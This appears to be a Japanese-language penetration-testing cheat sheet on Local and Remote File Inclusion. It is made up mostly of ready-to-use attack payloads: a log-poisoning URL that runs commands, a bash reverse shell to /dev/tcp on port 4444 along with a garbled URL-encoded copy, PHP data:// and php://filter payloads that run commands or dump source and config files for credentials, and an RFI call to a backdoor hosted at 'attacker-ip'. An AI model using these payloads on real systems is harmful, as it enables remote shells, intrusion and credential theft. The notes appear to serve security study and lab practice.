## Local File Inclusion (LFI) & Remote File Inclusion (RFI)

### 概要

**Local File Inclusion (LFI)** は、攻撃者がサーバー上のファイルを含めることで、リモートからシステムの情報を取得したり、コマンドを実行したりする攻撃手法です。  
一方、**Remote File Inclusion (RFI)** は、リモートのファイルをサーバーに含めて、任意のコードを実行する攻撃手法です。

### LFIとRFIの違い

- LFIはサーバー上のローカルファイルをインクルードします。
- RFIはリモートからのファイルをインクルードします。

---

## Local File Inclusion (LFI)

LFIは、ディレクトリトラバーサル攻撃と似ていますが、リモートからコマンドを実行できる点が異なります。

### コマンド実行の例

以下のURLを使用して、リモートでコマンドを実行します：

- http
```bash
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
```
上記の例では、whoamiコマンドをcmdパラメータに渡して実行しています。
- リバースシェルの実行
リバースシェルを実行するには、次のコマンドをcmdパラメータに渡します：

```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
- URLエンコードされたリバースシェル
次のように、リバースシェルコマンドをURLエンコードして送信します：
```bash
%20-c%20%22```bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

- PHP Wrapperを利用したLFI
PHPのラッパーを使用して、ファイルの内容をリモートから取得します：
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php"
```
## Remote File Inclusion (RFI)
RFIは、リモートからファイルをインクルードし、コードを実行する攻撃手法です。

RFIの手順
PHPシェルを用意します。
ファイルサーバーをホストします。
次のように、RFIを実行します：
- http
```bash
http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
```
PHPのリバースシェルをホストし、シェルを取得することもできます。
## LFIの脆弱性が見つかった場合
LFIの脆弱性が見つかった場合、以下のURLで認証情報を取得できることがあります：

- http
```bash
http://192.168.0.104/?page=php://filter/read=convert.base64-encode/resource=config
```
この例では、configファイルの内容がBase64でエンコードされて出力されることがあります。
### 参考サイト
- Qiita - LFI攻撃
- Hacking Articles - Local File Inclusionの包括的ガイド
- Medium - Local File Inclusion (LFI) Web Application Penetration Testing
